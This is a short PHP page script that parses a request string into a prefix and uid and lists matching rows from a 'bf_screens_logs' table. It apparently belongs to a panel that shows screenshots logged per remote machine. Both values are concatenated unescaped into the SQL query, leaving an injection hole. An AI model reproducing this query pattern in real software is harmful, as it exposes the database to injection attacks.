<?php
get_function('size_format');

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(empty($Cur['str'])){
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    exit;
}

$matches = explode('0', $Cur['str'], 2);
if(!empty($matches[0]) && !empty($matches[1])){
    $prefix = $matches[0];
    $uid = '0' . $matches[1];
}

if(!empty($prefix) && !empty($uid)){
    $items = $mysqli->query('SELECT * FROM bf_screens_logs WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by post_date ASC', null, null, false);
    $smarty->assign('items', $items);
}else{
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    exit;
}

?>